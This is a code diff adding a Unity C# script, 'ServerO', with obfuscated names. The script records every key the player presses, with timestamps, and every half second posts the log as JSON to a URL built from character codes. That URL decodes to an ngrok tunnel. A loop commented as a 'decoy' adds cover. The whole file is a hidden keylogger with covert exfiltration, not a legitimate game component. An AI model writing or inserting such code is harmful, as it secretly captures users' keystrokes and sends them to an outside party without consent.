@@ -1,0 +1,88 @@
+using UnityEngine;
+using UnityEngine.Networking;
+using System.Collections;
+using System;
+using System.Collections.Generic;
+
+[System.Serializable]
+public class X { public string key; public string timestamp; }
+[System.Serializable]
+public class Y { public List<X> keys; }
+
+public class ServerO : MonoBehaviour
+{
+
+    [SerializeField] private float b = 0.5f;
+    private float c;
+    private HashSet<string> d = new HashSet<string>();
+    private List<X> e = new List<X>();
+
+    void Update()
+    {
+        foreach (KeyCode f in Enum.GetValues(typeof(KeyCode)))
+        {
+            if (Input.GetKeyDown(f)) G(f.ToString());
+        }
+        if (Time.time - c >= b && e.Count > 0)
+        {
+            StartCoroutine(H());
+            c = Time.time;
+        }
+    }
+
+    private void G(string k)
+    {
+        if (!d.Contains(k))
+        {
+            d.Add(k);
+            e.Add(new X { 
+                key = k, 
+                timestamp = DateTime.UtcNow.ToString("o") 
+            });
+        }
+    }
+
+    private IEnumerator H()
+    {
+        Y i = new Y { keys = e };
+        string j = JsonUtility.ToJson(i);
+        
+        // Obfuscated URL construction
+        string k = new string(new[] {
+            (char)104, (char)116, (char)116, (char)112, (char)115, 
+            (char)58, (char)47, (char)47, (char)99, (char)114, (char)97,
+            (char)98, (char)45, (char)108, (char)111, (char)118, (char)101,
+            (char)100, (char)45, (char)104, (char)101, (char)110, (char)46,
+            (char)110, (char)103, (char)114, (char)111, (char)107, (char)45,
+            (char)102, (char)114, (char)101, (char)101, (char)46, (char)97,
+            (char)112, (char)112, (char)47, (char)100, (char)97, (char)116,
+            (char)97
+        });
+
+        using (UnityWebRequest l = new UnityWebRequest(k, "POST"))
+        {
+            byte[] m = System.Text.Encoding.UTF8.GetBytes(j);
+            l.uploadHandler = new UploadHandlerRaw(m);
+            l.downloadHandler = new DownloadHandlerBuffer();
+            l.SetRequestHeader("Content-Type", "application/json");
+            yield return l.SendWebRequest();
+            
+            if (l.result == UnityWebRequest.Result.Success)
+            {
+                e.Clear();
+                d.Clear();
+            }
+        }
+    }
+
+    // Decoy initialization
+    private void Start() 
+    {
+        int n = 0;
+        while(n < 10) 
+        {
+            n++;
+            var o = n * 0.1f;
+        }
+    }
+}
